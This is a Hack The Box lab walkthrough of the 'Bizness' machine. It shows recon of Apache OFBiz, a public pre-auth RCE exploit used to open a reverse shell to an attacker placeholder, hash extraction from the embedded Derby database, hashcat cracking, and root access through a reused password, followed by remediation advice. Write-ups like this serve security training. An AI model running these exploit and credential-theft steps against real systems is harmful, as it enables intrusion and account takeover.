<div align="center">

# 💼 HTB: Bizness

![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)

`hackthebox` `linux` `apache-ofbiz` `cve-2023-49070` `derby-database` `password-reuse`

</div>

---

> **TL;DR** — Apache OFBiz has a well-documented pre-auth RCE chain (CVE-2023-49070/CVE-2023-51467). One public exploit later, there's a shell — and the app's embedded Derby database is sitting right there with the admin's password hash in it. Crack it, and it turns out the sysadmin reused that exact password for `root`.

## 📋 Box Info

| | |
|---|---|
| 🖥️ **OS** | Linux (Debian 11) |
| 🎯 **Target** | `<TARGET_IP>` (bizness.htb) |
| 🎚️ **Difficulty** | Medium |
| 📅 **Date** | January 5, 2026 |
| 🏁 **Outcome** | ✅ Full compromise (~45 minutes, scan to root) |

## 🔍 Recon

```bash
nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 8000
```

| Port | Service |
|:---:|---|
| `22` | OpenSSH 8.4p1 (Debian) |
| `80` / `443` | nginx 1.18.0, forced HTTPS redirect |
| `38009` | tcpwrapped — turns out to be a loopback-only internal component, not externally reachable |

> 💡 The TLS cert is self-signed and valid for **305 years** (2023–2328). Not exploitable by itself, but it's the kind of "someone typed a huge number without thinking" artifact that hints at rushed or careless configuration elsewhere.

### Fingerprinting the app

```bash
curl -k https://bizness.htb/control/main
```

```
Copyright (c) 2001-2026 The Apache Software Foundation. Powered by Apache OFBiz Release 18.12
```

Apache OFBiz 18.12 has a well-known critical vulnerability chain — worth checking the exact patch level before anything else.

---

## 🚩 Shell as `ofbiz` — CVE-2023-49070 / CVE-2023-51467

OFBiz ≤ 18.12.09 has a pre-authentication RCE via an authentication-bypass-then-deserialization chain (CVSS 9.8). A public PoC exists and works out of the box.

> ⚠️ **Root cause:** authentication bypass in the controller request-routing logic, chained with insecure deserialization — no credentials needed at any point.

```bash
# Java 21 fails on this exploit's module access — swap to Java 11
sudo apt-get install openjdk-11-jdk
sudo update-alternatives --config java   # select Java 11
```

```bash
rlwrap nc -nlvp 4444
python3 ofbiz_exploit.py https://bizness.htb shell <ATTACKER_IP>:4444
```

```
ofbiz@bizness:/opt/ofbiz$ id
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
```

```bash
ofbiz@bizness:~$ cat user.txt
<USER_FLAG_REDACTED>
```

---

## 👑 Root — Derby Database Hash → Cracked → Password Reuse

### Pulling the admin hash straight out of the embedded database

OFBiz ships with Apache Derby as its default embedded DB. The raw data files are readable by the `ofbiz` user:

```bash
strings /opt/ofbiz/runtime/data/derby/ofbiz/seg0/*.dat | grep -E "currentPassword|admin"
```

```xml
<eeval-UserLogin currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" userLoginId="admin"/>
```

Format is `$SHA$salt$hash` — PBKDF2-HMAC-SHA1, 10,000 iterations, per OFBiz's own `security.properties`.

> ⚠️ **10,000 iterations is weak for 2026.** That's the difference between "cracks in five minutes" and "infeasible."

```bash
echo 'sha1:10000:ZA==:uP0_QaVBpDWFeo8-dRzDqRwXQ2I' > admin.hash
hashcat -m 10900 admin.hash /usr/share/wordlists/rockyou.txt
```

Cracked in under 5 minutes: **`monkeybizness`**

### Password reuse takes it the rest of the way

```bash
ofbiz@bizness:~$ su root
Password: monkeybizness

root@bizness:~# whoami
root
```

```bash
root@bizness:~# cat root.txt
<ROOT_FLAG_REDACTED>
```

> 💡 The root cause of the actual *compromise* here isn't the hash weakness — it's that the sysadmin used the same password for an application admin account and the OS root account. Either mistake alone is bad; both together is game over.

---

## 🔗 Full Attack Chain

```
Apache OFBiz 18.12 pre-auth RCE (CVE-2023-49070/51467)
   → shell as ofbiz
   → Derby database strings → admin password hash
   → PBKDF2-SHA1 crack (rockyou.txt, ~5 min)
   → password reuse on root account
   → full compromise
```

## 🛠️ Remediation

| Finding | Fix |
|---|---|
| Apache OFBiz ≤ 18.12.10 pre-auth RCE | Upgrade to ≥ 18.12.11 (or current); this is a well-known, patched CVE. |
| Admin password hash readable via Derby data files | Restrict OS-level file permissions on the Derby datastore; consider migrating to a properly access-controlled RDBMS. |
| Weak PBKDF2 iteration count (10,000) | Raise to ≥ 100,000, or migrate to Argon2id. |
| Password reuse between app admin and OS root | Enforce unique credentials per account/system; disable direct root login in favor of individually-audited sudo. |

---

<div align="center">

*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*

</div>
